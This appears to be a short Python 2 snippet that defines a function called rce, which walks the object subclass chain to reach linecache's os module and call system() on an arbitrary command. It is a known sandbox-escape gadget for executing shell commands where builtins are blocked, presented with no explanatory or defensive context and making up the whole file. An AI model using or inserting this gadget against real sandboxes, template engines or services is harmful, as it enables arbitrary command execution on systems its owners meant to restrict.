# -*- coding：utf-8 -*-

def rce(cmd):
    [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system(cmd)